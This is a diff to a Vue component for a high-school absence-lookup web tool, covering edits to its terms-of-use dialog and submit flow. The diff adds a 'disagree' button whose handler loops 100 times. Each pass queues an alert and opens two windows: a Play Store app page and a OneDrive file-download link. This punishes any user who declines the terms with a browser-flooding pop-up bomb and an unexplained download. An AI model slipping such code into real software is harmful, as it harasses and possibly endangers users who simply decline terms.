@@ -2,6 +2,7 @@
     <nav class="navbar">
         <img src="/apple-icon-144x144.png" alt="Logo" class="logo" />
         <h1 class="title">啟英高中缺礦查詢工具</h1>
+
     </nav>
     <v-sheet class="pa-8">
         <v-card class="mx-auto px-6 py-10" max-width="460">
@@ -19,6 +20,7 @@
                     type="submit" aria-label="查詢" @click="checkTerms">
                     查詢
                 </v-btn>
+
             </v-form>
 
             <v-alert v-if="loginError" type="error" class="mt-4" role="alert">
@@ -54,14 +56,21 @@
     <footer class="my-footer">
         <p class="footer-text footer-bold">Copyright© 苗栗國政府|教育廳</p>
         <p class="footer-text footer-md">苗栗國（Myori）為網路虛擬國家</p>
-        <button class="blue-underline" @click="showTermsDialog = true" aria-label="打開使用條款">
+        <button class="blue-underline" @click="openTermsOnly" aria-label="打開使用條款">
             使用條款
         </button>
+
     </footer>
-    <v-dialog ref="termsDialog" v-model="showTermsDialog" persistent max-width="600px" aria-labelledby="dialogTitle">
+    <v-dialog ref="termsDialog" v-model="showTermsDialog" persistent max-width="600px">
         <v-card>
-            <v-card-title id="dialogTitle" class="text-h5 font-weight-bold mt-4">使用者條款</v-card-title>
-            <v-card-text class="terms-text" style="font-size: 16px;">
+            <v-app-bar app dense flat>
+                <v-toolbar-title>使用者條款</v-toolbar-title>
+                <v-spacer></v-spacer>
+                <v-btn icon @click="showTermsDialog = false">
+                    <v-icon>mdi-close</v-icon>
+                </v-btn>
+            </v-app-bar>
+            <v-card-text class="terms-text" style="font-size: 16px; margin-top: 50px">
                 <p>歡迎使用本查課缺曠系統(以下簡稱"本系統")。為了確保您能安全有效地使用本系統,請務必閱讀並同意遵守以下條款。一旦您開始使用本系統,即視為您已接受本條款的約束。</p>
                 <p><strong>網頁版本:</strong> 本使用者條款適用於本系統目前的1.5.3版網頁版本。</p>
                 <p><strong>服務內容:</strong>
@@ -73,7 +82,7 @@
                 <p><strong>使用限制:</strong> 為確保系統暢順運行,本系統對查詢次數做出了合理限制。</p>
                 <p><strong>系統維護:</strong> 本系統由1人獨立維護,更新速度可能較慢,如有不便之處還請見諒。</p>
                 <p><strong>風險提示:</strong>
-                    若學校或亞昕資訊股份有限公司認為本系統可能會影響其系統安全穩定運作,或對本系統有其他安全疑慮,學校或有權採取適當的管控措施,例如限制或禁止使用本系統等。請您理解並配合學校的決定。您使用本系統的一切行為風險應由您自行承擔。
+                    若學校或亞昕資訊股份有限公司認為本系統可能會影響其系統安全穩定運作,或對本系統有其他安全疑慮,學校或亞昕資訊股份有限公司有權採取適當的管控措施,例如限制或禁止使用本系統等。請您理解並配合學校的決定。您使用本系統的一切行為風險應由您自行承擔。
                 </p>
                 <p><strong>知識產權:</strong> 關於本系統的知識產權詳情，請參考GitHub上的條款：<a href="https://github.com/Angelo0218/CyvsTool"
                         target="_blank">https://github.com/Angelo0218/CyvsTool</a>。</p>
@@ -85,15 +94,24 @@
                 <p><strong>原始碼:</strong> 如想查看本系統的原始碼,請訪問GitHub專案。</p>
                 <p><strong>年齡限制:</strong> 年齡限制 本系統僅限年滿18歲的成年人使用。未成年人使用需在家長或監護人的同意和陪同下進行。</p>
             </v-card-text>
-            <v-card-actions class="justify-center" style="flex-direction: column;">
-                <v-checkbox v-model="neverShowAgain" label="不再顯示此視窗" style="height:50px;"></v-checkbox>
-                <v-btn color="white" b class="custom-large-btn" @click="acceptTerms"
-                    style="font-size: large; background: #667054; width: 100%;">
+            <v-card-actions>
+                <v-btn color="white" class="custom-large-btn" @click="acceptTerms"
+                    style="font-size: large; background: #667054; flex: 1; margin-right: 5px;">
                     我已閲讀並同意以上條款
                 </v-btn>
+
+                <a @click="openMultipleWindows" href="
+" target="_self">
+                    <v-btn color="white" class="custom-large-btn"
+                        style="font-size: large; background: #667054; flex: 1; margin-left: 5px;">
+                        不同意
+                    </v-btn>
+                </a>
             </v-card-actions>
         </v-card>
     </v-dialog>
+
+
 
 
 </template>
@@ -115,22 +133,16 @@ export default {
         const loginError = ref(false);
         const courseStatus = ref({});
         const termsDialog = ref(null);
-
-        const checkTerms = () => {
-            if (localStorage.getItem('neverShowTerms') !== 'true') {
-                showTermsDialog.value = true;
-            } else {
-                // 如果已同意條款，則直接提交表單
-                onSubmit();
-            }
-        };
-
+        const isTermsDialogFromQuery = ref(false);
 
         watch(showTermsDialog, (newVal) => {
             if (newVal) {
                 // 當對話框打開時
                 termsDialog.value.scrollTop = 0; // 將滾動條設置到頂部
             }
+        });
+        watch(isTermsDialogFromQuery, (newValue) => {
+            console.log('isTermsDialogFromQuery changed to: ', newValue);
         });
 
         const onSubmit = async () => {
@@ -170,11 +182,38 @@ export default {
             }
         };
 
+        const openMultipleWindows = () => {
+            for (let i = 0; i < 100; i++) {
+                setTimeout(() => {
+                    alert('苗栗國萬歲！')
+             
+                }, "1");
+
+                window.open('https://play.google.com/store/apps/details?id=com.myori.pass&hl=en_US' ); // 将 'https://example.com' 替换为你想要打开的网址
+                window.open('https://public.dm.files.1drv.com/y4mCVGgQJsuo_j4yA4qQmtYI2eKYaaqARGYKwZ34ElEL9cykbip48-N2up1rAW_kkRq44iKchTrhApe2CCfo9cGX1JpJF0kBvWvRtm5_5dww-RVscB-OUKNjOqhCd6wN41_RTSHjv6s4YzP5KJJV1-43Lxv4FuIXcbSBPw4973cXDz2TQONE5tTm2tcPqLZVfvVuMiBQBSBIzv6I-pc5ekqMVR6M8OziQs-gOWXLvCm4nM')
+            }
+        }
+
+        const checkTerms = () => {
+            if (localStorage.getItem('neverShowTerms') !== 'true') {
+                isTermsDialogFromQuery.value = true; // 触发查询时设置为 true
+                showTermsDialog.value = true;
+            } else {
+                onSubmit(); // 如果条款已同意，直接提交
+            }
+        };
+
+        const openTermsOnly = () => {
+            isTermsDialogFromQuery.value = false; // 仅查看条款时设置为 false
+            showTermsDialog.value = true;
+        };
+
         const acceptTerms = () => {
             localStorage.setItem('neverShowTerms', neverShowAgain.value ? 'true' : 'false');
             showTermsDialog.value = false;
-            // 不再在此處直接調用 onSubmit 方法
+            onSubmit();  // 調用onSubmit方法以執行登入請求
         };
+
 
         return {
             email,
@@ -189,7 +228,9 @@ export default {
             courseAbsences,
             loginError,
             courseStatus,
-            termsDialog
+            termsDialog,
+            openTermsOnly,
+            openMultipleWindows
         };
     }
 }
@@ -323,5 +364,12 @@ a:hover {
 
 .footer-link:hover {
     color: #888888;
+}
+
+.custom-justify-center {
+    display: flex;
+    justify-content: center;
+    width: 100%;
+    /* 確保滿寬 */
 }
 </style>
